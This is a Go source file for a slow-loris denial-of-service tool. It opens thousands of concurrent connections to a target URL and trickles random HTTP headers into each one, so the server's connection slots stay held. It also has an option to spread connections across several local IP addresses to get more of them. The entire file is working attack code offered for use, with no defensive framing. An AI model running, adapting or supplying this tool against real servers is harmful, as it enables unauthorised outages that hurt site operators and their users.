//This program executes the slow-loris DDoS attack by sending an infinite amount of HTTP headers slowly.
package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
)

//Config contains the configuration for this program.
var Config struct {
	URLString, Method, InterfacePrefix                           string
	Addr                                                         *net.TCPAddr
	Interval, NumWorkers, Connrate                               int
	IsHTTPS                                                      bool
	TLSConfig                                                    *tls.Config
	MinKeyLength, MaxKeyLength, MinValueLength, MaxValueLength   int
	URL                                                          *url.URL
}

//Stats contains the statistics which get printed every second. It is basically the amount of connecting and sending workers
//at any given moment.
var Stats struct {
	Connecting, Sending int32
}

func init() {
    //We need rand to generate random HTTP header key-value pairs
	rand.Seed(time.Now().UnixNano())
	flag.StringVar(&Config.InterfacePrefix, "iface", "", "Use all local addresses from this interface.")
	flag.StringVar(&Config.URLString, "url", "http://localhost/", "The url to attack")
	flag.StringVar(&Config.Method, "method", "GET", "The method of the HTTP request")
	flag.IntVar(&Config.Connrate, "connrate", 50, "Rate of connection establishing")
    flag.IntVar(&Config.Interval, "interval", 5, "Interval in seconds between sending headers")
	flag.IntVar(&Config.NumWorkers, "workers", 5000, "Number of workers")
	flag.IntVar(&Config.MinKeyLength, "min-key-length", 8, "Minimum length of the key of a random generated header key-value pair")
	flag.IntVar(&Config.MaxKeyLength, "max-key-length", 15, "Maximum length of the key of a random generated header key-value pair")
	flag.IntVar(&Config.MinValueLength, "min-value-length", 10, "Minimum length of the value of a random generated header key-value pair")
	flag.IntVar(&Config.MaxValueLength, "max-value-length", 20, "Maximum length of the value of a random generated header key-value pair")
}

func main() {
	var err error
    
    //Parse the command-line arguments.
	flag.Parse()
    
	Config.URL, err = url.Parse(Config.URLString)
	if err != nil {
		fmt.Println("Failed to parse url: ", Config.URLString)
		return
	}

    //Check if we need TLS
	if strings.ToLower(Config.URL.Scheme) == "https" {
		Config.IsHTTPS = true
		Config.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	}
    
    //Check if hostname already contains the port. We need a port for TCP to connect to.
    //If no port is set, we use the standard ones for http/https.
	host := Config.URL.Host
	if !strings.Contains(host, ":") {
		if Config.IsHTTPS {
			host += ":443"
		} else {
			host += ":80"
		}
	}
    
	Config.Addr, err = net.ResolveTCPAddr("tcp", host)
	if err != nil {
		fmt.Println("Failed to resolve host: ", host)
		return
	}

    if Config.InterfacePrefix == "" {
		//Start the workers
		for i := 1; i <= Config.NumWorkers; i++ {
				go func() {
					for {
						RunConnection(nil)
					}
				}()
				if (i % Config.Connrate) == 0 {
					time.Sleep(time.Second)
					fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
				}
			}
    } else {
        ifaces, err := net.Interfaces()
        if err != nil {
            fmt.Println(err)
            return
        }
        localAddresses := make([]string, 0, len(ifaces))
        for _, iface := range ifaces {
            if !strings.HasPrefix(iface.Name, Config.InterfacePrefix) {
                continue
            }
            addrs, err := iface.Addrs()
            if err != nil {
                continue
            }
            for _, addr := range addrs {
                ipnet, ok := addr.(*net.IPNet)
                if !ok {
                    continue
                }
                ipv4 := ipnet.IP.To4()
                if ipv4 == nil {
                    continue
                }
                localAddresses = append(localAddresses, ipv4.String())
            }
        }
        if len(localAddresses) == 0 {
            fmt.Println("No IP addresses found!")
            return
        } else if len(localAddresses) * 60000 < Config.NumWorkers {
            fmt.Println("Not enough IP addresses found!")
            return
		}
        fmt.Printf("Using following IPs: %+v\n", localAddresses)

		//Start the workers
		for i := 1; i <= Config.NumWorkers; i++ {
				go func(addr *net.TCPAddr) {
					for {
						RunConnection(addr)
					}
				}(&net.TCPAddr{IP: net.ParseIP(localAddresses[i / 60000]), Port: 2049 + (i % 60000)})
				if (i % Config.Connrate) == 0 {
					time.Sleep(time.Second)
					fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
				}
			}
	}
    //Start the statistics printer
	ticker := time.NewTicker(1 * time.Second)
	for _ = range ticker.C {
		fmt.Println("Connecting: ", Stats.Connecting, "| Sending: ", Stats.Sending)
	}
}

//TryConnect tries to connect to the host specified in config.addr. It repeatedly tries to connect with a timeout of 100 milliseconds
//if the host is unreachable. If config.isHTTP is set, then an additional TLS connection is started and the handshake is executed, making
//the connection usable immediately after returning.
func TryConnect(localAddr *net.TCPAddr) net.Conn {
	const millisecondsBeforeRetry = 100
	var conn net.Conn
	for {
		tcpconn, err := net.DialTCP("tcp", localAddr, Config.Addr)
		if err == nil && tcpconn != nil {
			tcpconn.SetNoDelay(true)
			conn = tcpconn
			if Config.IsHTTPS {
				c := tls.Client(conn, Config.TLSConfig)
				err = c.Handshake()
				if err != nil {
                    //If the handshake failed, we restart the connection.
					c.Close()
					time.Sleep(millisecondsBeforeRetry * time.Millisecond)
					continue
				}
				conn = c
			}
			return conn
		}
		time.Sleep(millisecondsBeforeRetry * time.Millisecond)
	}
}

//RunConnection runs a single connection by first connecting to the host, and then sending HTTP headers in slow-loris style.
//The interval between sending headers is specified by config.interval. If necessary an underlying TLS connection is established to
//support HTTPS.
func RunConnection(localAddr *net.TCPAddr) {
    //Try to connect first. This blocks until a connection is made.
	atomic.AddInt32(&Stats.Connecting, 1)
	conn := TryConnect(localAddr)
	atomic.AddInt32(&Stats.Connecting, -1)
    
	atomic.AddInt32(&Stats.Sending, 1)
    
    //At the end automatically close our connection and decrease Stats.Sending as we stopped sending due to an error or a closed connection.
	defer atomic.AddInt32(&Stats.Sending, -1)
	defer conn.Close()
    
    //Create a bufio.Writer for easy writing of strings.
	writer := bufio.NewWriter(conn)
    
    //Send the HTTP header line.
	_, err := writer.WriteString(Config.Method + " " + Config.URL.RequestURI() + " HTTP/1.1\r\n")
	if err != nil {
		return
	}
	err = writer.Flush()
	if err != nil {
		return
	}
	if !IsConnAlive(conn) {
		return
	}

	for {
        //Now we just send a new header every interval.
		time.Sleep(time.Second * time.Duration(Config.Interval))
		_, err = writer.WriteString(GenerateRandomHeader(
			Config.MinKeyLength, Config.MaxKeyLength, Config.MinValueLength, Config.MaxValueLength) + "\r\n")
		if err != nil {
			return
		}
		err = writer.Flush()
		if err != nil {
			return
		}
		if !IsConnAlive(conn) {
			return
		}
	}

}

//IsConnAlive checks the TCP connection by issueing a read on a buffer of size 0 with a timeout
//of 5 milliseconds. If an error is returned and the error is not a timeout, IsConnAlive assumes
//that the connection has been closes and returns false. Otherwise true is returned.
func IsConnAlive(conn net.Conn) bool {
    var one = []byte{ 0,}
    
	conn.SetReadDeadline(time.Now().Add(5 * time.Millisecond))
    
	n, err := conn.Read(one)
	if err != nil {
        //Try to cast the error as net.Error to check if a timeout occurred.
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			return true
		}
        //Probably io.EOF to indicate that the remote side has closed the connection.
		return false
	}
    
    if n > 0 {
        //If we can actually read this byte then something is really wrong since we should be 
        //sending only. By returning false we ensure the connection gets restarted
        return false
    }
    
    //This is a weird case since we should have gotten an error, but we assume the connection is still good.
    return true
}

//GenerateRandomHeader generates a random header key-value pair of the form Xyyyy: Xyyyy where X is a capital letter and
//y is either a number, a lower case letter or a dash
func GenerateRandomHeader(minKeyLength, maxKeyLength, minValueLength, maxValueLength int) string {
	const capitals = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const letters = "abcdefghijklmnopqrstuvwxyz1234567890-"
	keyLen := minKeyLength + rand.Intn(maxKeyLength - minKeyLength + 1)
	valueLen := minValueLength + rand.Intn(maxValueLength - minValueLength + 1)

	b := make([]byte, keyLen + valueLen + 2)
	i := 0
    
    //Generate the key
	if keyLen > 0 {
		b[i] = capitals[rand.Intn(len(capitals))]
		for i++; i < keyLen; i++ {
			b[i] = letters[rand.Intn(len(letters))]
		}
	}

	b[i] = ':'
	b[i+1] = ' '
	i += 2

    //Generate the value
	if valueLen > 0 {
		b[i] = capitals[rand.Intn(len(capitals))]
		for i++; i < keyLen + valueLen + 2; i++ {
			b[i] = letters[rand.Intn(len(letters))]
		}
	}
	return string(b)
}
